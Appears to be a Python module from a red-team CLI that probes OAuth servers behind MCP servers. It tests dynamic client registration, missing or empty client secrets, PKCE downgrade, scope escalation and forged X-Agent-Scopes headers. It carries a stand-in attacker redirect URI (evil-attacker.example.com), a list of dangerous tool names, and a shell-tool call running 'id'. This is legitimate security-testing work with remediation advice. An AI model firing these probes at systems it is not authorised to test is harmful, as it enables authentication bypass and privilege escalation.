"""OAuth 2.0 attack surface — test the auth server backing this MCP server.

The MCP 2025 spec mandates OAuth 2.0 as the authentication mechanism.
This module discovers the authorization server via /.well-known/* and
tests for common OAuth misconfigurations that let attackers bypass auth
or escalate privileges.

Tests (no valid token required):
  1. Public client registration abuse — POST to registration_endpoint
  2. Client credentials without client_secret
  3. Client credentials with empty/null client_secret
  4. PKCE downgrade — code_challenge_method=plain instead of S256
  5. Token endpoint accepts expired / future-dated JWTs

Tests (valid token required — user supplied --auth-header):
  6. X-Agent-Scopes header forgery — add extra tool scopes to calls
  7. Scope escalation — request broader scopes than originally granted
"""

from __future__ import annotations

import base64
import json
import time
import urllib.parse

from agentsentinel_cli.redteam.models import RedTeamFinding


def run_oauth(
    url: str,
    original_headers: dict[str, str],
    timeout: float,
    verbose: bool,
    skip_external: bool = False,
) -> tuple[list[RedTeamFinding], int]:
    """
    Run OAuth 2.0 attack surface tests.
    Returns (findings, probes_fired).
    """
    try:
        import httpx
    except ImportError:
        return [], 0

    findings: list[RedTeamFinding] = []
    probes = 0
    parsed = urllib.parse.urlparse(url.rstrip("/"))
    mcp_origin = f"{parsed.scheme}://{parsed.netloc}"

    with httpx.Client(timeout=timeout, follow_redirects=True) as client:
        meta, as_origin, is_external = _discover_metadata(client, mcp_origin)

        if meta is None:
            return findings, probes + 3  # count the discovery probes

        probes += 3

        # Report external AS — always emit the INFO, then optionally skip tests
        if is_external:
            findings.append(RedTeamFinding(
                attack_type="oauth",
                severity="INFO",
                title=f"External OAuth AS discovered — {as_origin}",
                tool_name="<auth-server>",
                parameter=None,
                payload=f"GET {mcp_origin}/.well-known/oauth-protected-resource",
                evidence=(
                    f"MCP server ({mcp_origin}) delegates authentication to:\n"
                    f"  Authorization server: {as_origin}\n"
                    f"  token_endpoint: {meta.get('token_endpoint', 'unknown')}"
                ),
                exploit_scenario=(
                    "The MCP server follows the MCP 2025 spec and delegates OAuth to a "
                    f"separate authorization server at {as_origin}. "
                    "All OAuth attack tests below target that AS directly. "
                    "Use --skip-oauth if this AS is out of scope for your engagement."
                ),
                mitre_id="T1078.004",
                owasp_id="ASI06",
                confidence="HIGH",
            ))

            if skip_external:
                findings.append(RedTeamFinding(
                    attack_type="oauth",
                    severity="INFO",
                    title=f"OAuth tests skipped — external AS out of scope (--skip-oauth)",
                    tool_name="<auth-server>",
                    parameter=None,
                    payload="",
                    evidence=f"Authorization server at {as_origin} not tested per --skip-oauth.",
                    exploit_scenario=(
                        "OAuth attack tests were suppressed because --skip-oauth was set. "
                        "Re-run without --skip-oauth if you have authorization to test the AS."
                    ),
                    mitre_id=None,
                    owasp_id=None,
                    confidence="HIGH",
                ))
                return findings, probes

        # Tests that don't need a valid token
        probes += _test_public_registration(client, meta, findings, verbose)
        probes += _test_token_no_secret(client, meta, findings, verbose)
        probes += _test_token_empty_secret(client, meta, findings, verbose)
        probes += _test_pkce_downgrade(client, meta, findings, verbose)

        # Tests that benefit from a valid token
        has_token = "Authorization" in original_headers
        if has_token:
            probes += _test_scope_escalation(client, url, original_headers, meta, as_origin, findings, verbose)
            probes += _test_agent_scope_forgery(client, url, original_headers, findings, verbose)

    return findings, probes


def _discover_metadata(
    client,
    mcp_origin: str,
) -> tuple[dict | None, str, bool]:
    """
    Follow the MCP 2025 OAuth discovery chain.

    Returns (metadata, as_origin, is_external):
      metadata    — OAuth AS metadata dict, or None if no AS found
      as_origin   — base URL where the AS lives (may differ from MCP server)
      is_external — True when the AS is hosted on a different origin
    """
    # Step 1: MCP 2025 spec — oauth-protected-resource on the MCP server
    # advertises which authorization server to use
    try:
        resp = client.get(f"{mcp_origin}/.well-known/oauth-protected-resource")
        if resp.status_code == 200:
            protected = resp.json()
            auth_servers = protected.get("authorization_servers", [])
            if auth_servers:
                as_base = auth_servers[0].rstrip("/")
                as_meta = _fetch_as_metadata(client, as_base)
                if as_meta:
                    return as_meta, as_base, _is_different_origin(mcp_origin, as_base)
    except Exception:
        pass

    # Step 2: Co-located AS — check AS metadata directly on MCP server origin
    as_meta = _fetch_as_metadata(client, mcp_origin)
    if as_meta:
        return as_meta, mcp_origin, False

    return None, mcp_origin, False


def _fetch_as_metadata(client, base_url: str) -> dict | None:
    """Try standard OAuth AS discovery paths on a given base URL."""
    for path in [
        "/.well-known/oauth-authorization-server",
        "/.well-known/openid-configuration",
    ]:
        try:
            resp = client.get(f"{base_url}{path}")
            if resp.status_code == 200:
                return resp.json()
        except Exception:
            continue
    return None


def _is_different_origin(url1: str, url2: str) -> bool:
    """Return True when url1 and url2 have different scheme+host+port."""
    p1 = urllib.parse.urlparse(url1)
    p2 = urllib.parse.urlparse(url2)
    return p1.netloc != p2.netloc


def _test_public_registration(
    client,
    meta: dict,
    findings: list[RedTeamFinding],
    verbose: bool,
) -> int:
    reg_endpoint = meta.get("registration_endpoint")
    if not reg_endpoint:
        return 0

    payload = {
        "client_name": "agentsentinel-redteam",
        "redirect_uris": ["https://evil-attacker.example.com/callback"],
        "grant_types": ["client_credentials", "authorization_code"],
        "response_types": ["code", "token"],
        "scope": " ".join(meta.get("scopes_supported", ["read", "write", "admin"])),
        "token_endpoint_auth_method": "none",
    }

    try:
        resp = client.post(
            reg_endpoint,
            json=payload,
            headers={"Content-Type": "application/json"},
        )
    except Exception:
        return 1

    if resp.status_code in (200, 201):
        try:
            body = resp.json()
            client_id = body.get("client_id", "")
        except Exception:
            client_id = ""
            body = {}

        findings.append(RedTeamFinding(
            attack_type="oauth",
            severity="CRITICAL",
            title="OAuth: public client registration succeeded — attacker can obtain valid client_id",
            tool_name="<auth-server>",
            parameter=None,
            payload=f"POST {reg_endpoint}",
            evidence=(
                f"HTTP {resp.status_code} — client registered\n"
                + (f"client_id: {client_id}" if client_id else resp.text[:200])
            ),
            exploit_scenario=(
                "An attacker registered a new OAuth client without any prior authorization. "
                "With a valid client_id they can initiate authorization flows, request tokens, "
                "and potentially gain access to MCP tools by impersonating a legitimate agent."
            ),
            mitre_id="T1078.004",
            owasp_id="ASI06",
            confidence="HIGH",
            remediation=(
                "Require a registration access token (RFC 7591 §3.1) or disable dynamic client "
                "registration entirely. Only allow pre-registered clients in production."
            ),
            request_body=payload if verbose else None,
            response_body=resp.text[:500] if verbose else None,
        ))
    elif resp.status_code == 401:
        # Server correctly requires auth — good
        pass

    return 1


def _test_token_no_secret(
    client,
    meta: dict,
    findings: list[RedTeamFinding],
    verbose: bool,
) -> int:
    token_endpoint = meta.get("token_endpoint")
    if not token_endpoint:
        return 0

    payload = {
        "grant_type": "client_credentials",
        "client_id": "agentsentinel-probe",
        "scope": " ".join(meta.get("scopes_supported", ["read"])[:3]),
    }

    try:
        resp = client.post(
            token_endpoint,
            data=payload,
            headers={"Content-Type": "application/x-www-form-urlencoded"},
        )
    except Exception:
        return 1

    if resp.status_code == 200:
        try:
            token = resp.json().get("access_token", "")
        except Exception:
            token = ""

        findings.append(RedTeamFinding(
            attack_type="oauth",
            severity="CRITICAL",
            title="OAuth: token issued without client_secret — unauthenticated token acquisition",
            tool_name="<auth-server>",
            parameter=None,
            payload=f"POST {token_endpoint} (no client_secret)",
            evidence=(
                f"HTTP {resp.status_code} — token issued\n"
                + (f"access_token: {token[:40]}…" if token else resp.text[:200])
            ),
            exploit_scenario=(
                "The token endpoint issued a valid access token with only a client_id and no "
                "secret. Any attacker who knows (or guesses) a valid client_id can obtain a "
                "token and call MCP tools."
            ),
            mitre_id="T1078.004",
            owasp_id="ASI06",
            confidence="HIGH",
            remediation=(
                "Require client authentication at the token endpoint. For confidential clients, "
                "enforce client_secret_basic or client_secret_post. "
                "For public clients, require PKCE (RFC 7636)."
            ),
            request_body=payload if verbose else None,
            response_body=resp.text[:500] if verbose else None,
        ))

    return 1


def _test_token_empty_secret(
    client,
    meta: dict,
    findings: list[RedTeamFinding],
    verbose: bool,
) -> int:
    token_endpoint = meta.get("token_endpoint")
    if not token_endpoint:
        return 0

    payload = {
        "grant_type": "client_credentials",
        "client_id": "agentsentinel-probe",
        "client_secret": "",
        "scope": " ".join(meta.get("scopes_supported", ["read"])[:3]),
    }

    try:
        resp = client.post(
            token_endpoint,
            data=payload,
            headers={"Content-Type": "application/x-www-form-urlencoded"},
        )
    except Exception:
        return 1

    if resp.status_code == 200:
        findings.append(RedTeamFinding(
            attack_type="oauth",
            severity="CRITICAL",
            title="OAuth: token issued with empty client_secret",
            tool_name="<auth-server>",
            parameter=None,
            payload=f"POST {token_endpoint} (client_secret='')",
            evidence=f"HTTP {resp.status_code} — token issued with empty secret\n{resp.text[:200]}",
            exploit_scenario=(
                "The token endpoint accepts an empty string as a valid client_secret. "
                "This effectively means any client_id grants access with no credential check."
            ),
            mitre_id="T1078.004",
            owasp_id="ASI06",
            confidence="HIGH",
            remediation=(
                "Validate that client_secret is non-empty and matches the registered credential. "
                "Reject empty string, null, and whitespace-only secrets explicitly."
            ),
            request_body=payload if verbose else None,
            response_body=resp.text[:500] if verbose else None,
        ))

    return 1


def _test_pkce_downgrade(
    client,
    meta: dict,
    findings: list[RedTeamFinding],
    verbose: bool,
) -> int:
    """
    Test if the auth server accepts code_challenge_method=plain.
    The MCP 2025 spec requires S256. plain is weaker — the verifier is
    sent in the clear during token exchange, exposable via logs/proxies.
    """
    auth_endpoint = meta.get("authorization_endpoint")
    if not auth_endpoint:
        return 0

    methods = meta.get("code_challenge_methods_supported", [])
    if "plain" not in methods and methods:
        # Server explicitly doesn't support plain — skip live test
        return 1

    # Build a minimal auth code request with plain PKCE
    code_verifier = "agentsentinel_redteam_probe_verifier_plain_method_test"
    params = {
        "response_type": "code",
        "client_id": "agentsentinel-probe",
        "redirect_uri": "https://evil-attacker.example.com/callback",
        "code_challenge": code_verifier,
        "code_challenge_method": "plain",
        "scope": "read",
        "state": "rt_probe",
    }

    try:
        # Do NOT follow redirects — we need to inspect the redirect target to
        # distinguish "accepted, proceed to login" (true positive) from "rejected
        # due to unknown client_id" (false positive). With follow_redirects=True
        # both cases land on a 200 page and are indistinguishable.
        resp = client.get(auth_endpoint, params=params, follow_redirects=False)
    except Exception:
        return 1

    # Determine acceptance vs rejection:
    #   302 with Location NOT containing error= → AS accepted the request and
    #     redirected to login or consent — plain PKCE was not rejected.
    #   302 with error= in Location → AS rejected (e.g. unknown client_id) before
    #     evaluating PKCE method — this is not a PKCE finding.
    #   200 → AS rendered a form or code directly — check body for error markers.
    #   400/401 → AS rejected the method explicitly — no finding.
    accepted = False
    evidence_detail = f"HTTP {resp.status_code}"

    if resp.status_code == 302:
        location = resp.headers.get("location", "")
        if "error=" not in location:
            accepted = True
            evidence_detail = f"HTTP 302 → {location[:120]}"
    elif resp.status_code == 200:
        body = resp.text[:800]
        error_markers = ('"error"', "'error'", "error=", "error_description",
                         "invalid_client", "unauthorized_client", "access_denied",
                         "invalid_request")
        if not any(m in body for m in error_markers):
            accepted = True
            evidence_detail = f"HTTP 200 — response contains no error indicators"

    if accepted:
        findings.append(RedTeamFinding(
            attack_type="oauth",
            severity="MEDIUM",
            title="OAuth: PKCE plain method accepted (S256 not enforced)",
            tool_name="<auth-server>",
            parameter=None,
            payload=f"GET {auth_endpoint} (code_challenge_method=plain)",
            evidence=f"{evidence_detail} — server accepted plain PKCE challenge method",
            exploit_scenario=(
                "The authorization server accepts PKCE with `method=plain`, meaning the code "
                "verifier is transmitted in cleartext during token exchange. An attacker with "
                "access to server logs, proxy logs, or network traffic can recover the verifier "
                "and exchange the authorization code themselves. "
                "The MCP 2025 spec requires S256."
            ),
            mitre_id="T1078.004",
            owasp_id="ASI06",
            confidence="MEDIUM",
            remediation=(
                "Enforce `code_challenge_method=S256` and reject `plain` at the authorization "
                "endpoint. Set `code_challenge_methods_supported: ['S256']` in metadata."
            ),
        ))

    return 1


def _test_scope_escalation(
    client,
    url: str,
    original_headers: dict,
    meta: dict,
    as_origin: str,
    findings: list[RedTeamFinding],
    verbose: bool,
) -> int:
    """
    If we have a valid token, try to request a new token with broader scopes
    than what the original token carries.
    """
    token_endpoint = meta.get("token_endpoint")
    if not token_endpoint:
        return 0

    orig_auth = original_headers.get("Authorization", "")
    if not orig_auth.startswith("Bearer "):
        return 0

    # Refuse to forward the caller's real Bearer token to a token_endpoint
    # that is on a different host from the AS we discovered. A malicious AS
    # metadata document could point token_endpoint at an attacker-controlled
    # server to exfiltrate the credential.
    token_ep_netloc = urllib.parse.urlparse(token_endpoint).netloc
    as_netloc = urllib.parse.urlparse(as_origin).netloc
    if token_ep_netloc != as_netloc:
        findings.append(RedTeamFinding(
            attack_type="oauth",
            severity="HIGH",
            title="OAuth: token_endpoint on unexpected external host — credential exfiltration risk",
            tool_name="<auth-server>",
            parameter=None,
            payload=f"token_endpoint={token_endpoint}",
            evidence=(
                f"The token_endpoint advertised in AS metadata ({token_endpoint}) "
                f"is on a different host from the authorization server ({as_origin}). "
                "Scope escalation probe skipped to protect the caller's Bearer token."
            ),
            exploit_scenario=(
                "An adversarial MCP server (or compromised AS metadata) advertises a "
                "token_endpoint on an attacker-controlled host. Any client that POSTs "
                "a refresh/scope-escalation request to that endpoint — including its "
                "Authorization: Bearer header — hands the production token to the attacker."
            ),
            mitre_id="T1078.004",
            owasp_id="ASI06",
            confidence="HIGH",
            remediation=(
                "Ensure the token_endpoint hostname matches the authorization server's "
                "origin. Reject or warn on cross-origin token endpoints before sending credentials."
            ),
        ))
        return 1

    # All supported scopes — attempt to get all of them
    all_scopes = meta.get("scopes_supported", [])
    if not all_scopes:
        return 0

    broad_scope = " ".join(all_scopes)
    payload = {
        "grant_type": "refresh_token",
        "refresh_token": "probe",
        "scope": broad_scope,
    }

    try:
        resp = client.post(
            token_endpoint,
            data=payload,
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "Authorization": orig_auth,
            },
        )
    except Exception:
        return 1

    if resp.status_code == 200:
        try:
            granted_scope = resp.json().get("scope", "")
        except Exception:
            granted_scope = ""

        findings.append(RedTeamFinding(
            attack_type="oauth",
            severity="HIGH",
            title="OAuth: scope escalation — broader scopes granted than requested",
            tool_name="<auth-server>",
            parameter=None,
            payload=f"POST {token_endpoint} (scope={broad_scope[:60]})",
            evidence=(
                f"HTTP {resp.status_code} — token issued\n"
                f"Requested: {broad_scope[:100]}\n"
                f"Granted: {granted_scope[:100]}"
            ),
            exploit_scenario=(
                "A token exchange request with broader scopes than originally granted succeeded. "
                "An attacker with a low-privilege token can escalate to higher-privilege scopes "
                "including tool access that was not originally authorized."
            ),
            mitre_id="T1078.004",
            owasp_id="ASI06",
            confidence="HIGH",
            remediation=(
                "Enforce scope downscoping only — never issue a token with broader scopes than "
                "the original grant. Validate requested scopes against the original authorization."
            ),
        ))
    else:
        # The AS rejected the probe refresh token (expected for well-configured production AS
        # that validates refresh tokens). This does not mean scope escalation is impossible —
        # it means the test requires a real refresh token to complete. Emit an INFO finding
        # so the operator knows the test ran but could not verify the outcome.
        try:
            error_code = resp.json().get("error", "")
        except Exception:
            error_code = ""

        skip_reasons = ("invalid_grant", "unsupported_grant_type", "invalid_client")
        if any(r in error_code for r in skip_reasons):
            findings.append(RedTeamFinding(
                attack_type="oauth",
                severity="INFO",
                title="OAuth: scope escalation test skipped — AS requires a valid refresh token",
                tool_name="<auth-server>",
                parameter=None,
                payload=f"POST {token_endpoint} (grant_type=refresh_token, scope={broad_scope[:60]})",
                evidence=(
                    f"HTTP {resp.status_code}  error={error_code}\n"
                    "The AS correctly rejected the probe refresh token. To test scope escalation "
                    "fully, provide a real refresh token via --auth-header or re-test manually:\n"
                    f"  POST {token_endpoint}\n"
                    f"  grant_type=refresh_token&refresh_token=<real_token>&scope={broad_scope[:80]}"
                ),
                exploit_scenario=(
                    "Scope escalation via refresh_token grant could not be automatically verified "
                    "because the AS validates refresh token authenticity. Manual testing with a "
                    "real refresh token is needed to confirm whether the AS enforces scope "
                    "downscoping on token renewal."
                ),
                mitre_id="T1078.004",
                owasp_id="ASI06",
                confidence="HIGH",
                remediation=(
                    "Ensure the token endpoint enforces scope downscoping: never issue a renewed "
                    "token with broader scopes than the original grant. Validate requested scopes "
                    "against the original authorization record."
                ),
            ))

    return 1


def _test_agent_scope_forgery(
    client,
    url: str,
    original_headers: dict[str, str],
    findings: list[RedTeamFinding],
    verbose: bool,
) -> int:
    """
    MCP-specific: test whether X-Agent-Scopes header forgery bypasses tool-level
    scope enforcement. Some MCP servers use this header to grant agents access
    to specific tools. If the server trusts a client-supplied header, an
    authenticated agent can escalate to tools outside its granted scope.
    """
    base = url.rstrip("/")

    # Common dangerous tool names to probe
    dangerous_tool_names = [
        "execute_shell", "shell", "run_command", "exec", "bash",
        "write_file", "delete_file", "create_file", "admin",
    ]

    scope_values = [
        "*",
        "execute_shell execute admin write delete",
        "admin:all tools:all",
        "superuser root",
    ]

    for scope_val in scope_values[:2]:  # Keep it targeted
        forged_headers = dict(original_headers)
        forged_headers["X-Agent-Scopes"] = scope_val

        # Try initializing with forged scope header — does server accept it?
        try:
            resp = client.post(base, json={
                "jsonrpc": "2.0",
                "method": "initialize",
                "params": {
                    "protocolVersion": "2024-11-05",
                    "capabilities": {},
                    "clientInfo": {"name": "agentsentinel-redteam", "version": "0.9.5"},
                },
                "id": 1,
            }, headers={**forged_headers, "Content-Type": "application/json"})
        except Exception:
            continue

        if resp.status_code == 200:
            # Now try calling a dangerous tool with forged scope
            for tool_name in dangerous_tool_names[:3]:
                try:
                    tool_resp = client.post(base, json={
                        "jsonrpc": "2.0",
                        "method": "tools/call",
                        "params": {"name": tool_name, "arguments": {"command": "id"}},
                        "id": 2,
                    }, headers={**forged_headers, "Content-Type": "application/json"})
                except Exception:
                    continue

                body = tool_resp.text[:500]
                # Success indicators: tool executed (not "tool not found" or "unauthorized")
                not_found = any(kw in body.lower() for kw in (
                    "not found", "unknown tool", "no such tool", "tool does not exist"
                ))
                scope_denied = any(kw in body.lower() for kw in (
                    "unauthorized", "forbidden", "scope", "permission denied"
                ))

                if tool_resp.status_code == 200 and not not_found and not scope_denied:
                    findings.append(RedTeamFinding(
                        attack_type="oauth",
                        severity="CRITICAL",
                        title=f"X-Agent-Scopes forgery — dangerous tool '{tool_name}' callable with forged scope",
                        tool_name=tool_name,
                        parameter=None,
                        payload=f"X-Agent-Scopes: {scope_val}",
                        evidence=(
                            f"Tool '{tool_name}' responded to call with forged header "
                            f"`X-Agent-Scopes: {scope_val}`\n{body[:200]}"
                        ),
                        exploit_scenario=(
                            f"The server trusts the client-supplied `X-Agent-Scopes` header. "
                            f"An authenticated agent with limited scope can forge this header "
                            f"to invoke `{tool_name}` — a tool that should require elevated "
                            f"privileges. This breaks the entire scope-based access model."
                        ),
                        mitre_id="T1078.004",
                        owasp_id="ASI06",
                        confidence="HIGH",
                        remediation=(
                            "Never trust client-supplied scope headers. Derive agent scope "
                            "from the validated OAuth token claims (e.g. `scope` or custom "
                            "claims in the JWT), not from HTTP headers the client controls."
                        ),
                        request_body={
                            "tool": tool_name, "X-Agent-Scopes": scope_val
                        } if verbose else None,
                        response_body=body if verbose else None,
                    ))
                    return 1  # One confirmed finding per scope forgery attempt is enough

    return len(scope_values[:2])
